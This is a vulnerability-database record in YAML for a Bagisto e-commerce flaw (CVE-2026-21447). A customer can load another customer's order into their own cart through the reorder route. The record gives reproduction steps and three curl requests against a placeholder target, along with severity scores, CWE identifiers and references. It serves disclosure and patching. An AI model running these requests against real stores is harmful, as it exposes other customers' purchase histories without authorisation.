vulnerability_id: VCID-2fct-4t83-6kdr
aliases:
  - CVE-2026-21447
  - GHSA-x5rw-qvvp-5cgm
summary: |
  Bagisto has IDOR in Customer Order Reorder Functionality
  ### Summary

  An Insecure Direct Object Reference vulnerability in the customer order reorder function allows any authenticated customer to add items from another customer's order to their own shopping cart by manipulating the order ID parameter. This exposes sensitive purchase information and enables potential fraud.

  ### Details

  The vulnerability exists in the reorder method within OrderController.php. Unlike other order-related functions like view, cancel, printInvoice that properly validate customer ownership, the reorder function retrieves orders using only the order ID without verifying that the order belongs to the authenticated customer.

  Code location: `packages/Webkul/Shop/src/Http/Controllers/Customer/Account/OrderController.php`

  Exposed Route: `packages/Webkul/Shop/src/Routes/customer-routes.php`

  ```php
  Route::get('reorder/{id}', 'reorder')->name('shop.customers.account.orders.reorder');
  ```

  ### PoC

  I. Create victim account and place an order.
  II. Login as attacker.
  III. Exploit IDOR and navigate like:  http://target.xxx/customer/account/orders/reorder/1
  IV. Check http://target.xxx/checkout/cart and verify exploitation.
  V. Victim's order items are now in Attacker's cart.

  ###Â PoC via curl:

  ```
  curl -c cookies.txt -X POST "http://target.xxx/customer/login" -d "email=attacker@evil.com&password=123qwe"

  curl -b cookies.txt "http://target.xxx/customer/account/orders/reorder/1"

  curl -b cookies.txt "http://target/api/checkout/cart"
  ```

  ### Impact

  - **Information Disclosure:** Attackers can discover what products other customers have purchased.
  - **Potential Fraud:** Attackers could potentially exploit this for social engineering or targeted attacks.
severities:
  - score: '0.00032'
    scoring_system: epss
    scoring_elements: '0.08728'
    published_at: '2026-01-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2026-21447
  - score: '0.00033'
    scoring_system: epss
    scoring_elements: '0.09349'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2026-21447
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-x5rw-qvvp-5cgm
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
    published_at: None
    url: https://github.com/bagisto/bagisto
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/bagisto/bagisto
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
    published_at: None
    url: https://github.com/bagisto/bagisto/commit/b2b1cf62577245d03a68532478cffbe321df74d3
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/bagisto/bagisto/commit/b2b1cf62577245d03a68532478cffbe321df74d3
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2026-01-02T21:30:27Z/
    published_at: None
    url: https://github.com/bagisto/bagisto/commit/b2b1cf62577245d03a68532478cffbe321df74d3
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
    published_at: None
    url: https://github.com/bagisto/bagisto/security/advisories/GHSA-x5rw-qvvp-5cgm
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/bagisto/bagisto/security/advisories/GHSA-x5rw-qvvp-5cgm
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/bagisto/bagisto/security/advisories/GHSA-x5rw-qvvp-5cgm
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2026-01-02T21:30:27Z/
    published_at: None
    url: https://github.com/bagisto/bagisto/security/advisories/GHSA-x5rw-qvvp-5cgm
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2026-21447
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2026-21447
weaknesses:
  - CWE-639
  - CWE-284
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2026-21447
    reference_type:
    reference_id:
  - url: https://github.com/bagisto/bagisto
    reference_type:
    reference_id:
  - url: https://github.com/bagisto/bagisto/commit/b2b1cf62577245d03a68532478cffbe321df74d3
    reference_type:
    reference_id:
  - url: https://github.com/bagisto/bagisto/security/advisories/GHSA-x5rw-qvvp-5cgm
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-21447
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-x5rw-qvvp-5cgm
    reference_type:
    reference_id: GHSA-x5rw-qvvp-5cgm
